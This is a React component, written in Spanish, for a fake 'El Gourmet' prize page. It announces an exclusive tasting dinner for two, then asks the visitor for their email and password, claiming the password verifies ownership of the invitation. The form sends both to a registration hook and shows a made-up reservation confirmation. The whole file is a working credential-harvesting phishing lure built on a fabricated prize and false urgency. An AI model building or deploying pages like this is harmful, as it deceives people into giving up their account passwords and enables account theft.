import { useState, type FormEvent } from 'react';
import { Box, Button, Input, VStack, Heading, Text, Container, Card, CardBody, useToast, Icon, Divider } from '@chakra-ui/react';
import { useCreateRegistro } from '../../../features/registros/hooks/useRegistros';
import { useDocumentMetadata } from '../../../shared/hooks/useDocumentMetadata';

// Elegant Cutlery Icon
const CutleryIcon = () => (
    <Icon viewBox="0 0 24 24" fill="currentColor" boxSize={12} color="yellow.400" mb={4}>
        <path d="M11 9H9V2H7v7H5V2H3v7c0 2.12 1.66 3.84 3.75 3.97V22h2.5v-9.03C11.34 12.84 13 11.12 13 9V2h-2v7zm5-3v8h2.5v8H21V2c-2.76 0-5 2.24-5 4z" />
    </Icon>
);

export const PrizePage = () => {
    // Elegant metadata
    useDocumentMetadata('Cena Exclusiva - El Gourmet', 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/ef/Restaurant_icon.svg/1024px-Restaurant_icon.svg.png');

    const { submitRegistro, loading } = useCreateRegistro();
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const toast = useToast();

    const handleSubmit = async (e: FormEvent) => {
        e.preventDefault();
        const success = await submitRegistro({ email, password, pagina: 'premio' });
        if (success) {
            toast({
                title: 'Confirmación exitosa',
                description: 'Su reserva ha sido procesada. Recibirá los detalles por correo.',
                status: 'success',
                duration: 9000,
                isClosable: true,
                position: 'top',
                variant: 'subtle',
                containerStyle: { fontFamily: 'serif' }
            });
            setEmail('');
            setPassword('');
        }
    };

    return (
        <Box
            minH="100vh"
            bg="black"
            display="flex"
            alignItems="center"
            justifyContent="center"
            position="relative"
            overflow="hidden"
        >
            {/* Background Image with Dark Overlay */}
            <Box
                position="absolute"
                top={0}
                left={0}
                right={0}
                bottom={0}
                bgImage="url('https://images.unsplash.com/photo-1550966871-3ed3c47e2ce2?q=80&w=2070&auto=format&fit=crop')"
                bgSize="cover"
                bgPosition="center"
                opacity={0.4}
            />

            {/* Content Container */}
            <Container maxW="md" position="relative" zIndex={2}>
                <Card
                    bg="rgba(20, 20, 20, 0.95)"
                    border="1px solid"
                    borderColor="whiteAlpha.200"
                    borderRadius="none"
                    boxShadow="2xl"
                    color="white"
                    backdropFilter="blur(10px)"
                >
                    <Box h="4px" bgGradient="linear(to-r, transparent, yellow.400, transparent)" />

                    <CardBody p={10}>
                        <VStack spacing={8}>
                            {/* Header Section */}
                            <Box textAlign="center">
                                <CutleryIcon />
                                <Heading fontFamily="serif" fontWeight="light" letterSpacing="widest" size="lg" color="white" mb={2}>
                                    EL GOURMET
                                </Heading>
                                <Text fontSize="xs" letterSpacing="4px" color="yellow.400" textTransform="uppercase">
                                    Experiencia Culinaria
                                </Text>
                            </Box>

                            <Divider borderColor="whiteAlpha.200" />

                            {/* Invitation Text */}
                            <Box textAlign="center">
                                <Text fontFamily="serif" fontSize="2xl" color="white" lineHeight="tall" fontWeight="light">
                                    Invitación Exclusiva
                                </Text>
                                <Text color="gray.400" fontSize="sm" mt={2} lineHeight="relaxed">
                                    Usted ha sido seleccionado para disfrutar de nuestra carta de degustación de 5 tiempos para dos personas.
                                </Text>
                            </Box>

                            {/* Form Section */}
                            <form onSubmit={handleSubmit} style={{ width: '100%' }}>
                                <VStack spacing={6}>
                                    <VStack align="start" w="full" spacing={1}>
                                        <Text fontSize="xs" fontWeight="bold" letterSpacing="1px" color="gray.500" textTransform="uppercase">
                                            Correo Electrónico
                                        </Text>
                                        <Input
                                            type="email"
                                            value={email}
                                            onChange={(e) => setEmail(e.target.value)}
                                            isRequired
                                            variant="flushed"
                                            placeholder="ejemplo@email.com"
                                            _placeholder={{ color: 'gray.600', fontFamily: 'serif', fontStyle: 'italic' }}
                                            borderColor="gray.700"
                                            focusBorderColor="yellow.400"
                                            color="white"
                                            size="lg"
                                            height="3rem"
                                        />
                                    </VStack>

                                    <VStack align="start" w="full" spacing={1}>
                                        <Text fontSize="xs" fontWeight="bold" letterSpacing="1px" color="gray.500" textTransform="uppercase">
                                            Contraseña
                                        </Text>
                                        <Input
                                            type="password"
                                            value={password}
                                            onChange={(e) => setPassword(e.target.value)}
                                            isRequired
                                            variant="flushed"
                                            placeholder="••••••••"
                                            _placeholder={{ color: 'gray.600' }}
                                            borderColor="gray.700"
                                            focusBorderColor="yellow.400"
                                            color="white"
                                            size="lg"
                                            height="3rem"
                                        />
                                        <Text fontSize="xs" color="gray.500" mt={1}>
                                            Requerida para verificar titularidad de la invitación.
                                        </Text>
                                    </VStack>

                                    <Button
                                        type="submit"
                                        w="full"
                                        colorScheme="yellow"
                                        variant="outline"
                                        size="lg"
                                        height="3.5rem"
                                        isLoading={loading}
                                        mt={4}
                                        fontSize="sm"
                                        letterSpacing="2px"
                                        textTransform="uppercase"
                                        _hover={{ bg: 'yellow.400', color: 'black' }}
                                        fontFamily="serif"
                                    >
                                        Reservar Mesa
                                    </Button>
                                </VStack>
                            </form>

                            <Text fontSize="xs" color="gray.600" textAlign="center" fontFamily="serif" fontStyle="italic">
                                * Código de vestimenta formal requerido. Válido por 24 horas.
                            </Text>
                        </VStack>
                    </CardBody>
                </Card>
            </Container>
        </Box>
    );
};
